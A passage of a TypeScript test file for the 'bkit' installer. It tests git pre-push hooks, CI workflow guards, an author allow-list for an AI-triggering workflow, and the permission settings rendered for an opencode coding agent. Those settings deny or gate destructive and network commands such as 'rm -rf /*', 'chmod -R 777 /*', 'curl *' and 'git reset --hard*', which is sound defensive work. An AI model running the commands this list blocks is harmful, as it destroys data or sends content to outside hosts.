    dispatchModules(new Set(["core", "lint"]), makeCtx({}));
    expect(fs.existsSync(path.join(tmpDir, ".husky", "pre-push"))).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// .husky/pre-push delete-only skip — runs the real hook with a stub `pnpm` on PATH
// that records each gate call, feeding git's pre-push stdin shape.
// ---------------------------------------------------------------------------

describe(".husky/pre-push delete-only push", () => {
  const ZERO = "0".repeat(40);
  const SHA = "a".repeat(40);
  const REPO = process.cwd();
  let tmp: string;

  beforeEach(() => {
    tmp = fs.mkdtempSync(path.join(os.tmpdir(), "bkit-prepush-"));
    fs.mkdirSync(path.join(tmp, "bin"));
    fs.writeFileSync(
      path.join(tmp, "bin", "pnpm"),
      `#!/bin/sh\necho "$*" >> "${tmp}/pnpm.log"\nexit 1\n`,
      { mode: 0o755 },
    );
  });
  afterEach(() => fs.rmSync(tmp, { recursive: true, force: true }));

  const runHook = (hook: string, stdin: string) => {
    const result = spawnSync("sh", [path.join(REPO, hook)], {
      cwd: tmp,
      input: stdin,
      encoding: "utf-8",
      timeout: 10_000,
      env: { ...process.env, PATH: `${path.join(tmp, "bin")}:${process.env.PATH}` },
    });
    const log = path.join(tmp, "pnpm.log");
    return { status: result.status, gated: fs.existsSync(log) };
  };

  for (const hook of [".bkit/templates/.husky/pre-push", ".husky/pre-push"]) {
    it(`${hook}: every ref deleted → exits 0 without running a gate`, () => {
      const stdin =
        `(delete) ${ZERO} refs/heads/a ${SHA}\n` + `(delete) ${ZERO} refs/heads/b ${SHA}\n`;
      expect(runHook(hook, stdin)).toEqual({ status: 0, gated: false });
    });

    it(`${hook}: a delete mixed with an update → gates still run`, () => {
      const stdin =
        `(delete) ${ZERO} refs/heads/a ${SHA}\n` + `refs/heads/dev ${SHA} refs/heads/dev ${ZERO}\n`;
      const r = runHook(hook, stdin);
      expect(r.gated).toBe(true);
      expect(r.status).not.toBe(0);
    });

    it(`${hook}: empty stdin → gates still run`, () => {
      expect(runHook(hook, "").gated).toBe(true);
    });
  }
});

// ---------------------------------------------------------------------------
// SHARED-DERIV portability + pipefail safety
//
// The SHARED-DERIV grep region of bkit-cloud.yml uses portable `grep -oE` + `sed`
// (no `grep -oP` PCRE lookbehind), with `|| true` guards on the ISSUE/FID assignments
// so a no-match exits 0 under `set -euo pipefail` and reaches the skip=true path.
// ---------------------------------------------------------------------------

describe("Challenge Finding 1 — SHARED-DERIV portability and pipefail safety regression", () => {
  const scriptsDir = import.meta.dirname ?? path.dirname(new URL(import.meta.url).pathname);
  const pkgRoot = path.resolve(scriptsDir, "..", "..", "..", "..", "..");

  function readBkitCloudYml(): string {
    return fs.readFileSync(path.join(pkgRoot, ".github", "workflows", "bkit-cloud.yml"), "utf-8");
  }

  function readBkitCloudTemplate(): string {
    return fs.readFileSync(
      path.join(pkgRoot, ".bkit", "templates", ".github", "workflows", "bkit-cloud.yml"),
      "utf-8",
    );
  }

  it("(1a) canonical bkit-cloud.yml contains NO grep -oP (PCRE lookbehind) — portability regression guard", () => {
    // grep -oP relies on PCRE, unavailable on BSD/macOS grep.
    const canonical = readBkitCloudYml();
    expect(canonical).not.toContain("grep -oP");
  });

  it("(1a) template bkit-cloud.yml contains NO grep -oP (PCRE lookbehind) — portability regression guard", () => {
    const template = readBkitCloudTemplate();
    expect(template).not.toContain("grep -oP");
  });

  it("(1b) ISSUE assignment in canonical has || true failure guard (pipefail safety)", () => {
    // Finding 1 (challenge-1): without || true, `set -euo pipefail` aborts the step
    // when grep exits 1 on a no-match PR body, making fallback/fail-safe dead code.
    // The ISSUE assignment must end with `|| true` so a no-match exits 0.
    const canonical = readBkitCloudYml();
    // The form: grep -oE ... | sed ... | head -1 || true
    expect(canonical).toMatch(/ISSUE=\$\(echo "\$PR_BODY" \| grep -oE[^\n]*\|\| true\)/);
  });

  it("(1b) FID assignment in canonical has || true failure guard (pipefail safety)", () => {
    const canonical = readBkitCloudYml();
    expect(canonical).toMatch(/FID=\$\(echo "\$PR_BODY" \| grep -oE[^\n]*\|\| true\)/);
  });

  it("(1b) ISSUE assignment in template has || true failure guard (pipefail safety)", () => {
    const template = readBkitCloudTemplate();
    expect(template).toMatch(/ISSUE=\$\(echo "\$PR_BODY" \| grep -oE[^\n]*\|\| true\)/);
  });

  it("(1b) FID assignment in template has || true failure guard (pipefail safety)", () => {
    const template = readBkitCloudTemplate();
    expect(template).toMatch(/FID=\$\(echo "\$PR_BODY" \| grep -oE[^\n]*\|\| true\)/);
  });

  it("(1c) SHARED-DERIV extraction snippet exits 0 under set -euo pipefail when PR body is empty (real-tool validation)", () => {
    // Finding 1 (challenge-1): the original code aborted on empty PR body.
    // This test extracts the actual ISSUE/FID assignment commands from the canonical
    // workflow and executes them under `set -euo pipefail` with an empty PR body to
    // prove the || true guards make the step exit 0 (not exit 1).
    const canonical = readBkitCloudYml();

    // Extract the two assignment lines from the SHARED-DERIV machinery.
    const sharedDerivStart = canonical.indexOf("# SHARED-DERIV:");
    expect(sharedDerivStart).toBeGreaterThan(-1);
    const sharedDerivBlock = canonical.slice(sharedDerivStart);

    // Pull out the ISSUE= and FID= lines (they contain the grep commands).
    const issueLineMatch = sharedDerivBlock.match(/ISSUE=\$\(echo "\$PR_BODY"[^\n]+\)/);
    const fidLineMatch = sharedDerivBlock.match(/FID=\$\(echo "\$PR_BODY"[^\n]+\)/);
    expect(
      issueLineMatch,
      "ISSUE= assignment line must be found after SHARED-DERIV",
    ).not.toBeNull();
    expect(fidLineMatch, "FID= assignment line must be found after SHARED-DERIV").not.toBeNull();

    const issueLine = issueLineMatch![0]!.trim();
    const fidLine = fidLineMatch![0]!.trim();

    // Build a minimal shell script that runs both assignments under strict mode
    // with an empty PR_BODY and asserts the variables are empty (no-match, no abort).
    const script = [
      "set -euo pipefail",
      'PR_BODY=""',
      issueLine,
      fidLine,
      // Assert variables are empty (grep found nothing, || true kept us alive)
      '[ -z "$ISSUE" ] || { echo "FAIL: ISSUE should be empty, got: $ISSUE"; exit 2; }',
      '[ -z "$FID" ]   || { echo "FAIL: FID should be empty, got: $FID"; exit 2; }',
      'echo "OK: both empty, script did not abort"',
    ].join("\n");

    const result = spawnSync("bash", ["-c", script], {
      encoding: "utf-8",
      timeout: 10_000,
    });

    expect(
      result.status,
      `SHARED-DERIV snippet aborted under set -euo pipefail with empty PR body.\n` +
        `stdout: ${result.stdout}\nstderr: ${result.stderr}`,
    ).toBe(0);
    expect(result.stdout).toContain("OK: both empty, script did not abort");
  });

  it("(1c) SHARED-DERIV extraction snippet correctly parses a well-formed PR body (positive case)", () => {
    // Complementary positive case: a PR body WITH the markers must yield the correct values.
    const canonical = readBkitCloudYml();

    const sharedDerivBlock = canonical.slice(canonical.indexOf("# SHARED-DERIV:"));

    const issueLineMatch = sharedDerivBlock.match(/ISSUE=\$\(echo "\$PR_BODY"[^\n]+\)/);
    const fidLineMatch = sharedDerivBlock.match(/FID=\$\(echo "\$PR_BODY"[^\n]+\)/);
    expect(issueLineMatch).not.toBeNull();
    expect(fidLineMatch).not.toBeNull();

    const issueLine = issueLineMatch![0]!.trim();
    const fidLine = fidLineMatch![0]!.trim();

    const script = [
      "set -euo pipefail",
      'PR_BODY="<!-- bkit:issue=#141 bkit:fid=141-cloud-app -->"',
      issueLine,
      fidLine,
      '[ "$ISSUE" = "141" ] || { echo "FAIL: expected ISSUE=141, got: $ISSUE"; exit 2; }',
      '[ "$FID" = "141-cloud-app" ] || { echo "FAIL: expected FID=141-cloud-app, got: $FID"; exit 2; }',
      'echo "OK: ISSUE=$ISSUE FID=$FID"',
    ].join("\n");

    const result = spawnSync("bash", ["-c", script], {
      encoding: "utf-8",
      timeout: 10_000,
    });

    expect(
      result.status,
      `SHARED-DERIV snippet failed to parse well-formed PR body.\n` +
        `stdout: ${result.stdout}\nstderr: ${result.stderr}`,
    ).toBe(0);
    expect(result.stdout).toContain("OK: ISSUE=141 FID=141-cloud-app");
  });
});

// ---------------------------------------------------------------------------
// claude.yml author_association gate
//
// The @claude trigger's `if:` carries `contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'),
// github.event.comment.author_association)` (and equivalents) on all four event paths.
// ---------------------------------------------------------------------------

describe("Challenge Finding 2 — claude.yml author_association allow-list regression", () => {
  const scriptsDir = import.meta.dirname ?? path.dirname(new URL(import.meta.url).pathname);
  const pkgRoot = path.resolve(scriptsDir, "..", "..", "..", "..", "..");

  function readClaudeYml(): string {
    return fs.readFileSync(path.join(pkgRoot, ".github", "workflows", "claude.yml"), "utf-8");
  }

  it("claude.yml issue_comment path has author_association gate", () => {
    // Finding 2: the original file had no author_association check on any event path.
    // All four event paths must now carry the allow-list to prevent drive-by triggers.
    const yml = readClaudeYml();
    // The issue_comment branch must guard on comment.author_association.
    expect(yml).toContain("github.event.comment.author_association");
  });

  it("claude.yml pull_request_review_comment path has author_association gate", () => {
    const yml = readClaudeYml();
    // pull_request_review_comment re-uses event.comment.author_association.
    // At minimum one of the two `pull_request_review` event paths must reference it.
    // The remediated file uses comment.author_association for both comment events.
    expect(yml).toContain("github.event.comment.author_association");
  });

  it("claude.yml pull_request_review path has author_association gate", () => {
    const yml = readClaudeYml();
    // The review path uses event.review.author_association.
    expect(yml).toContain("github.event.review.author_association");
  });

  it("claude.yml issues path has author_association gate", () => {
    const yml = readClaudeYml();
    // The issues path uses event.issue.user.author_association.
    expect(yml).toContain("github.event.issue.user.author_association");
  });

  it("claude.yml allow-list contains exactly OWNER, MEMBER, COLLABORATOR", () => {
    // The allow-list must use the literal three-association JSON array.
    // If someone narrows to OWNER-only or adds CONTRIBUTOR, this test catches it.
    const yml = readClaudeYml();
    expect(yml).toContain('["OWNER","MEMBER","COLLABORATOR"]');
  });

  it("claude.yml allow-list is checked via fromJSON (not string-match) for all @claude paths", () => {
    const yml = readClaudeYml();
    // All four event paths must use fromJSON('["OWNER","MEMBER","COLLABORATOR"]')
    // so the allow-list is evaluated as a JSON array, not a substring check.
    const matches = yml.match(/fromJSON\('?\["OWNER","MEMBER","COLLABORATOR"\]'?\)/g);
    // There are 4 event paths in the if: — each must carry the check.
    expect(matches, "Expected fromJSON allow-list on all 4 event paths").not.toBeNull();
    expect(matches!.length).toBeGreaterThanOrEqual(4);
  });

  it("claude.yml if: uses contains(...author_association) — not a string equality check", () => {
    const yml = readClaudeYml();
    // The check must be `contains(fromJSON(...), <author_association field>)` not
    // `github.event.comment.author_association == 'OWNER'` etc.
    expect(yml).toMatch(
      /contains\(fromJSON\([^)]*\),\s*github\.event\.(comment|review|issue\.user)\.author_association\)/,
    );
  });
});

// ---------------------------------------------------------------------------
// runOpencodeModule — opt-in opencode host (Task 2.2 "Done when")
// ---------------------------------------------------------------------------

describe("runOpencodeModule — clean install writeset (Task 2.2)", () => {
  // Resolve the real opencode model lookup from prompts.md (same source used at install time)
  const PROMPTS_MD = path.resolve(
    import.meta.dirname ?? path.dirname(new URL(import.meta.url).pathname),
    "..",
    "..",
    "..",
    "..",
    "prompts.md",
  );
  const CATALOG_MODEL_LOOKUP = parseModelLookup(PROMPTS_MD);
  const OPENCODE_MODEL_LOOKUP = buildOpencodeModelLookup(PROMPTS_MD, "opencode-zen");
  const EFFORT_MAP = parseEffortMap(PROMPTS_MD);
  const EXPECTED_AGENT_COUNT = CATALOG_MODEL_LOOKUP.size;

  function makeOpencodeCtx(overrides: Partial<ModuleContext> = {}): ModuleContext {
    return {
      dryRun: false,
      tokens: {
        DEFAULT_BRANCH: "main",
        PROJECT_NAME: "test-project",
        REPO_SLUG: "acme/test-project",
      },
      modelLookup: CATALOG_MODEL_LOOKUP,
      opencodeModelLookup: OPENCODE_MODEL_LOOKUP,
      effortMap: EFFORT_MAP,
      opencodeProvider: "ollama",
      advisories: [],
      ws: makeWriteSet(),
      logPrefix: "[bkit-install]",
      postDispatch: [],
      issueTracker: "none",
      ...overrides,
    };
  }

  it("clean install writes .opencode/agents/*.md (one per catalog agent)", () => {
    // Agent files are written via installFile and tracked in ws.writes so check exits 1 on drift.
    const ws = makeWriteSet();
    const ctx = makeOpencodeCtx({ ws });
    runOpencodeModule(ctx);

    expect(EXPECTED_AGENT_COUNT).toBeGreaterThan(0);

    const agentDir = path.join(tmpDir, ".opencode", "agents");
    expect(fs.existsSync(agentDir)).toBe(true);
    const agentFiles = fs.readdirSync(agentDir).filter((f) => f.endsWith(".md"));
    expect(agentFiles.length).toBe(EXPECTED_AGENT_COUNT);
    expect(ws.writes.filter((w) => w.path.includes(path.join(".opencode", "agents"))).length).toBe(
      EXPECTED_AGENT_COUNT,
    );

    // Verify agent files have opencode frontmatter
    for (const f of agentFiles) {
      const content = fs.readFileSync(path.join(agentDir, f), "utf-8");
      expect(content).toMatch(/^---\n/);
      expect(content).toContain("mode: subagent");
      expect(content).toContain("model:");
    }
  });

  it("clean install writes .opencode/commands/*.md (one per bkit workflow)", () => {
    // Command files are written via installFile and tracked in ws.writes so check exits 1 on drift.
    const ws = makeWriteSet();
    const ctx = makeOpencodeCtx({ ws });
    runOpencodeModule(ctx);

    const commandDir = path.join(tmpDir, ".opencode", "commands");
    expect(fs.existsSync(commandDir)).toBe(true);
    const commandFiles = fs.readdirSync(commandDir).filter((f) => f.endsWith(".md"));
    expect(
      ws.writes.filter((w) => w.path.includes(path.join(".opencode", "commands"))).length,
    ).toBe(commandFiles.length);
    expect(commandFiles.length).toBeGreaterThan(0);

    // Command files exist on disk
    for (const f of commandFiles) {
      expect(fs.existsSync(path.join(commandDir, f))).toBe(true);
    }
  });

  it("clean install writes .opencode/opencode.json", () => {
    const ws = makeWriteSet();
    const ctx = makeOpencodeCtx({ ws });
    runOpencodeModule(ctx);

    const jsonWrite = ws.writes.find((w) =>
      w.path.endsWith(path.join(".opencode", "opencode.json")),
    );
    expect(jsonWrite).toBeDefined();

    const jsonPath = path.join(tmpDir, ".opencode", "opencode.json");
    expect(fs.existsSync(jsonPath)).toBe(true);
    const parsed = JSON.parse(fs.readFileSync(jsonPath, "utf-8")) as Record<string, unknown>;
    // Must have permission + plugin blocks (no plaintext key material)
    expect(parsed).toHaveProperty("permission");
    expect(parsed).toHaveProperty("plugin");
    // No plaintext API key — provider key must be an env-var reference
    const jsonStr = JSON.stringify(parsed);
    expect(jsonStr).not.toMatch(/sk-[a-zA-Z0-9]{20,}/); // no raw API key
  });

  it("clean install writes .opencode/plugin/gateguard.js", () => {
    const ws = makeWriteSet();
    const ctx = makeOpencodeCtx({ ws });
    runOpencodeModule(ctx);

    const pluginWrite = ws.writes.find((w) =>
      w.path.endsWith(path.join(".opencode", "plugin", "gateguard.js")),
    );
    expect(pluginWrite).toBeDefined();
    expect(fs.existsSync(path.join(tmpDir, ".opencode", "plugin", "gateguard.js"))).toBe(true);
  });

  // Install is additive: a second provider install adds its block without
  // removing the first. Both openrouter + opencode blocks coexist after two installs.
  it("provider switch openrouter → opencode-go keeps both blocks (additive install)", () => {
    type OpencodeDoc = { provider?: Record<string, Record<string, unknown>> };
    const jsonPath = path.join(tmpDir, ".opencode", "opencode.json");

    runOpencodeModule(makeOpencodeCtx({ opencodeProvider: "openrouter" }));
    let parsed = JSON.parse(fs.readFileSync(jsonPath, "utf-8")) as OpencodeDoc;
    expect(
      parsed.provider?.openrouter,
      "openrouter provider seeded on first install",
    ).toBeDefined();
    expect(fs.readFileSync(jsonPath, "utf-8")).toContain("BKIT_OPENROUTER_API_KEY");

    // opencode-go renders a built-in block keyed `opencode-go` (apiKey only — no npm/baseURL).
    runOpencodeModule(makeOpencodeCtx({ opencodeProvider: "opencode-go" }));
    parsed = JSON.parse(fs.readFileSync(jsonPath, "utf-8")) as OpencodeDoc;
    // Additive: openrouter block is preserved alongside the new opencode-go block.
    expect(
      parsed.provider?.openrouter,
      "openrouter provider preserved (additive install)",
    ).toBeDefined();
    const go = parsed.provider?.["opencode-go"];
    expect((go?.options as Record<string, unknown>)?.apiKey).toBe("{env:BKIT_OPENCODE_API_KEY}");
    expect(go?.npm).toBeUndefined();
    expect((go?.options as Record<string, unknown>)?.baseURL).toBeUndefined();
  });

  it("reinstall heals a corrupted opencode-go block (strips hijacked npm/baseURL)", () => {
    type OpencodeDoc = { provider?: Record<string, Record<string, unknown>> };
    const jsonPath = path.join(tmpDir, ".opencode", "opencode.json");

    runOpencodeModule(makeOpencodeCtx({ opencodeProvider: "opencode-go" }));
    const doc = JSON.parse(fs.readFileSync(jsonPath, "utf-8")) as OpencodeDoc;
    // Consumer (or prior bug) hijacked the built-in with an ollama-shaped block.
    doc.provider!["opencode-go"] = {
      npm: "@ai-sdk/openai-compatible",
      name: "hijacked",
      options: {
        baseURL: "http://localhost:11434/v1",
        apiKey: "{env:BKIT_OPENCODE_API_KEY}",
      },
    };
    fs.writeFileSync(jsonPath, JSON.stringify(doc, null, 2) + "\n", "utf-8");

    runOpencodeModule(makeOpencodeCtx({ opencodeProvider: "opencode-go" }));
    const healed = JSON.parse(fs.readFileSync(jsonPath, "utf-8")) as OpencodeDoc;
    const block = healed.provider?.["opencode-go"];
    expect(block?.npm).toBeUndefined();
    expect(block?.name).toBeUndefined();
    expect((block?.options as Record<string, unknown>)?.baseURL).toBeUndefined();
    expect((block?.options as Record<string, unknown>)?.apiKey).toBe("{env:BKIT_OPENCODE_API_KEY}");
    expect(Object.keys(block ?? {})).toEqual(["options"]);
  });

  it("provider switch openrouter → openrouter keeps both provider blocks (additive install)", () => {
    type OpencodeDoc = { provider?: Record<string, unknown> };
    const jsonPath = path.join(tmpDir, ".opencode", "opencode.json");

    runOpencodeModule(makeOpencodeCtx({ opencodeProvider: "openrouter" }));
    runOpencodeModule(makeOpencodeCtx({ opencodeProvider: "openrouter" }));

    const parsed = JSON.parse(fs.readFileSync(jsonPath, "utf-8")) as OpencodeDoc;
    expect(parsed.provider?.openrouter, "openrouter provider present").toBeDefined();
    expect(
      parsed.provider?.openrouter,
      "openrouter provider preserved (additive install)",
    ).toBeDefined();
  });

  it("preserves both consumer-added and bkit provider blocks across a second install", () => {
    type OpencodeDoc = { provider?: Record<string, unknown> };
    const jsonPath = path.join(tmpDir, ".opencode", "opencode.json");

    runOpencodeModule(makeOpencodeCtx({ opencodeProvider: "openrouter" }));
    // Consumer adds their own provider under a key bkit never seeds.
    const doc = JSON.parse(fs.readFileSync(jsonPath, "utf-8")) as OpencodeDoc;
    (doc.provider as Record<string, unknown>)["my-custom"] = {
      npm: "@acme/driver",
      name: "my-custom",
      options: {},
    };
    fs.writeFileSync(jsonPath, JSON.stringify(doc, null, 2) + "\n", "utf-8");

    runOpencodeModule(makeOpencodeCtx({ opencodeProvider: "openrouter" }));
    const parsed = JSON.parse(fs.readFileSync(jsonPath, "utf-8")) as OpencodeDoc;
    expect(parsed.provider?.["my-custom"], "consumer provider preserved").toBeDefined();
    // Additive: the prior bkit openrouter block is also preserved.
    expect(
      parsed.provider?.openrouter,
      "prior bkit provider preserved (additive install)",
    ).toBeDefined();
    expect(parsed.provider?.openrouter, "new bkit provider present").toBeDefined();
  });

  it("additive install: openrouter then ollama → both provider blocks present", () => {
    type OpencodeDoc = { provider?: Record<string, unknown> };
    const jsonPath = path.join(tmpDir, ".opencode", "opencode.json");

    runOpencodeModule(makeOpencodeCtx({ opencodeProvider: "openrouter" }));
    runOpencodeModule(makeOpencodeCtx({ opencodeProvider: "ollama" }));

    const parsed = JSON.parse(fs.readFileSync(jsonPath, "utf-8")) as OpencodeDoc;
    expect(
      parsed.provider?.openrouter,
      "openrouter block present after additive install",
    ).toBeDefined();
    expect(
      parsed.provider?.["ollama"],
      "ollama block present after additive install",
    ).toBeDefined();
  });

  it("opencode setup advisory is emitted on --opencode=<provider> install (Task 2.2)", () => {
    const ctx = makeOpencodeCtx({ opencodeProvider: "openrouter" });
    runOpencodeModule(ctx);

    const advisory = ctx.advisories.find((a) => a.id === "opencode-setup");
    expect(advisory).toBeDefined();
    expect(advisory!.detect).toMatch(/opencode host installed/);
    // Advisory names the provider key env var
    expect(advisory!.action).toMatch(/BKIT_OPENROUTER_API_KEY/);
    // Advisory references bkit doctor/status
    expect(advisory!.action).toMatch(/bkit doctor/);
    expect(advisory!.action).toMatch(/bkit status/);
    // No plaintext API key echoed in advisory
    expect(advisory!.action).not.toMatch(/sk-[a-zA-Z0-9]{20,}/);
  });

  it("ollama advisory names its API key env var", () => {
    const ctx = makeOpencodeCtx({ opencodeProvider: "ollama" });
    runOpencodeModule(ctx);

    const advisory = ctx.advisories.find((a) => a.id === "opencode-setup");
    expect(advisory).toBeDefined();
    expect(advisory!.action).toMatch(/BKIT_OLLAMA_API_KEY/);
  });

  it("dry-run: no agent/command .md files written to disk, advisory still emitted", () => {
    const ws = makeWriteSet();
    const ctx = makeOpencodeCtx({ ws, dryRun: true });
    runOpencodeModule(ctx);

    // In dry-run: agent and command .md files must NOT exist on disk
    const agentDir = path.join(tmpDir, ".opencode", "agents");
    const commandDir = path.join(tmpDir, ".opencode", "commands");
    // Dirs may be created by ensureDir, but no .md files should be written
    if (fs.existsSync(agentDir)) {
      const agentFiles = fs.readdirSync(agentDir).filter((f) => f.endsWith(".md"));
      expect(agentFiles).toHaveLength(0);
    }
    if (fs.existsSync(commandDir)) {
      const commandFiles = fs.readdirSync(commandDir).filter((f) => f.endsWith(".md"));
      expect(commandFiles).toHaveLength(0);
    }
    // opencode.json and gateguard.js must not exist on disk
    expect(fs.existsSync(path.join(tmpDir, ".opencode", "opencode.json"))).toBe(false);
    expect(fs.existsSync(path.join(tmpDir, ".opencode", "plugin", "gateguard.js"))).toBe(false);
    // Advisory still fired
    expect(ctx.advisories.find((a) => a.id === "opencode-setup")).toBeDefined();
  });
});

// ---------------------------------------------------------------------------
// runOpencodeModule — transactional-staging zero-footprint (KN-12, Task 2.2)
// ---------------------------------------------------------------------------

describe("runOpencodeModule — staging zero-footprint on failure (KN-12, Task 2.2)", () => {
  const PROMPTS_MD = path.resolve(
    import.meta.dirname ?? path.dirname(new URL(import.meta.url).pathname),
    "..",
    "..",
    "..",
    "..",
    "prompts.md",
  );
  const OPENCODE_MODEL_LOOKUP = buildOpencodeModelLookup(PROMPTS_MD, "opencode-zen");
  const CATALOG_MODEL_LOOKUP = parseModelLookup(PROMPTS_MD);

  it("zero .opencode/ footprint before runOpencodeModule is called", () => {
    // Before any opencode install: .opencode/ must not exist in a fresh consumer dir
    expect(fs.existsSync(path.join(tmpDir, ".opencode"))).toBe(false);
  });

  it("after a successful install, .opencode/ exists; uninstalling leaves zero footprint", () => {
    const ws = makeWriteSet();
    const ctx = {
      dryRun: false,
      tokens: {
        DEFAULT_BRANCH: "main",
        PROJECT_NAME: "test-project",
        REPO_SLUG: "acme/test-project",
      },
      modelLookup: CATALOG_MODEL_LOOKUP,
      opencodeModelLookup: OPENCODE_MODEL_LOOKUP,
      effortMap: parseEffortMap(PROMPTS_MD),
      opencodeProvider: "ollama",
      advisories: [] as PreflightFinding[],
      ws,
      logPrefix: "[bkit-install]",
      postDispatch: [] as Array<() => void>,
      issueTracker: "none" as const,
    };

    runOpencodeModule(ctx);
    expect(fs.existsSync(path.join(tmpDir, ".opencode"))).toBe(true);

    // Simulate surgical removal: delete all .opencode/ bkit-prefix agent/command files
    const agentDir = path.join(tmpDir, ".opencode", "agents");
    const commandDir = path.join(tmpDir, ".opencode", "commands");
    const pluginDir = path.join(tmpDir, ".opencode", "plugin");

    if (fs.existsSync(agentDir)) fs.rmSync(agentDir, { recursive: true });
    if (fs.existsSync(commandDir)) fs.rmSync(commandDir, { recursive: true });
    if (fs.existsSync(pluginDir)) fs.rmSync(pluginDir, { recursive: true });
    const jsonPath = path.join(tmpDir, ".opencode", "opencode.json");
    if (fs.existsSync(jsonPath)) fs.rmSync(jsonPath);

    // After removal, agent/command/plugin dirs and json are gone
    expect(fs.existsSync(path.join(tmpDir, ".opencode", "opencode.json"))).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// renderOpencodeJson — provider block must match opencode's custom-provider schema
// (a stray `"api": "openai"` field makes opencode reject the whole config; env keys use
// {env:VAR}, never shell ${VAR}.)
// ---------------------------------------------------------------------------
describe("opencodeProviderId — bkit key → opencode-side provider id", () => {
  it("passes through custom providers (key === opencode id)", () => {
    for (const key of [
      "ollama",
      "openrouter",
      "openrouter",
      "openrouter",
      "openrouter",
      "ollama",
      "openrouter",
      "openrouter",
    ]) {
      expect(opencodeProviderId(key)).toBe(key);
    }
  });

  it("opencode-zen CLI key maps to built-in gateway id 'opencode' (models.dev)", () => {
    expect(opencodeProviderId("opencode-zen")).toBe("opencode");
  });

  it("opencode-go CLI key maps to built-in gateway id 'opencode-go'", () => {
    expect(opencodeProviderId("opencode-go")).toBe("opencode-go");
  });

  it("passes through an unknown key unchanged (defensive)", () => {
    expect(opencodeProviderId("acme")).toBe("acme");
  });
});

describe("renderOpencodeJson — opencode custom-provider format", () => {
  const TEMPLATE = path.resolve(".bkit/templates/.opencode/opencode.json");
  // Resolved at collection time — the `it` bodies below run after a chdir into a temp repo.
  const CLAUDE_SETTINGS_TEMPLATE = path.resolve(".bkit/templates/.claude/settings.json");

  it("openrouter (remote): npm driver, aggregator baseURL, apiKey via {env:BKIT_OPENROUTER_API_KEY}", () => {
    const parsed = JSON.parse(renderOpencodeJson(TEMPLATE, "github", "openrouter"));
    const block = parsed.provider?.openrouter;
    expect(block).toBeTruthy();
    expect(block.npm).toBe("@ai-sdk/openai-compatible");
    expect(block.options.baseURL).toBe("https://openrouter.ai/api/v1");
    expect(block.options.apiKey).toBe("{env:BKIT_OPENROUTER_API_KEY}");
    expect(block.api).toBeUndefined(); // an "api" field makes opencode reject the whole config
    expect(JSON.stringify(block)).not.toContain("${");
  });

  it("github MCP: type 'remote' (not 'http') + {env:} header — opencode schema valid", () => {
    // type "http" is valid for Claude/Cursor but NOT in opencode's enum (["local","remote"]);
    // its presence makes opencode reject the whole config.
    const parsed = JSON.parse(renderOpencodeJson(TEMPLATE, "github", "openrouter"));
    const gh = parsed.mcp?.github;
    expect(gh.type).toBe("remote");
    expect(gh.headers.Authorization).toBe("Bearer {env:BKIT_GH_TOKEN}");
    expect(JSON.stringify(parsed.mcp)).not.toContain('"http"');
    expect(JSON.stringify(parsed.mcp)).not.toContain("${");
  });

  it("linear MCP: type 'remote' (not 'http')", () => {
    const parsed = JSON.parse(renderOpencodeJson(TEMPLATE, "linear", "openrouter"));
    expect(parsed.mcp?.linear?.type).toBe("remote");
  });

  it("uses the 'plugin' key (singular), not 'plugins' (opencode schema)", () => {
    const parsed = JSON.parse(renderOpencodeJson(TEMPLATE, "github", "openrouter"));
    expect(parsed.plugin).toContain(".opencode/plugin/gateguard.js");
    expect(parsed.plugins).toBeUndefined();
  });

  it("permission: opencode tool-keyed map (not Claude {rules:[...]}), force-push gated", () => {
    const parsed = JSON.parse(renderOpencodeJson(TEMPLATE, "github", "openrouter"));
    const perm = parsed.permission;
    expect(perm.rules).toBeUndefined(); // the Claude-style array that opencode rejects
    expect(perm.edit).toBe("allow");
    expect(perm.task).toBe("allow");
    expect(typeof perm.bash).toBe("object");
    expect(perm.bash["git push --force*"]).toBe("deny");
    expect(perm.bash["git push --force-with-lease*"]).toBe("allow");
    expect(perm.bash["rm -rf /*"]).toBe("deny");
    expect(perm.bash["chmod -R 777 /*"]).toBe("deny");
    expect(perm.bash["sudo *"]).toBe("ask");
    expect(perm.bash["curl *"]).toBe("ask");
    expect(perm.bash["wget *"]).toBe("ask");
    // Stack hosts (vercel/supabase/…) are NOT shipped — only tooling defaults +
    // consumer `.agents/context.md` allowed-domains (after bkit:end).
    expect(perm.bash["curl *vercel.com*"]).toBeUndefined();
    expect(perm.bash["curl *github.com*"]).toBe("allow");
    const curlAskIdx = Object.keys(perm.bash).indexOf("curl *");
    const curlGhIdx = Object.keys(perm.bash).indexOf("curl *github.com*");
    expect(curlGhIdx).toBeGreaterThan(curlAskIdx);
    expect(perm.websearch).toBe("allow");
    // OpenCode schema: webfetch/websearch are Action only (ask|allow|deny), not
    // PermissionObjectConfig — URL maps fail validation (PermissionActionConfig).
    expect(perm.webfetch).toBe("ask");
    // Destructive-git + delete commands gated to parity with the Claude host
    // (.claude/settings.json ask-list); opencode is never weaker than the Claude peer.
    for (const cmd of [
      "git reset --hard*",
      "git clean -fd*",
      "git filter-branch*",
      "git checkout -- .*",
      "git restore .*",
      "git stash drop*",
      "git rebase -i*",
      "gh repo delete*",
      "gh pr close*",
      "gh release delete*",
    ]) {
      expect(perm.bash[cmd], `${cmd} must be gated 'ask'`).toBe("ask");
    }
    // last-match-wins: the --force-with-lease allow MUST come after the --force deny,
    // else force-with-lease (which matches "git push --force*") would be denied.
    const keys = Object.keys(perm.bash);
    expect(keys.indexOf("git push --force-with-lease*")).toBeGreaterThan(
      keys.indexOf("git push --force*"),
    );
  });

  // The other direction: the Claude side is never weaker than opencode.
  //
  // curl / wget are the documented exemption — see the KNOWN DIVERGENCE block in
  // install/modules/index.integration.test.ts. opencode gates them as `curl *: ask` and
  // layers `curl *{domain}*: allow` per allowlisted host (last-match-wins); Cursor parses
  // the URL host in guardrails.cjs; Claude runs them under `Bash(*)`.
  //
  // All three hosts run an allowlisted-host fetch unprompted. They differ only on an
  // UNDECLARED host, where Cursor and opencode ask and Claude does not.
  it("claude settings gate every bash class opencode gates (reverse-direction parity)", () => {
    const claudeSettings = JSON.parse(fs.readFileSync(CLAUDE_SETTINGS_TEMPLATE, "utf-8"));
    const gated = new Set<string>([
      ...claudeSettings.permissions.ask,
      ...claudeSettings.permissions.deny,
    ]);
    // opencode `"<cmd> *": "ask"|"deny"` ↔ claude `Bash(<cmd>:*)` / `Bash(<cmd> *)`.
    for (const cmd of [
      "sudo",
      "git reset --hard",
      "git clean -fd",
      "git filter-branch",
      "git checkout -- .",
      "git restore .",
      "git stash drop",
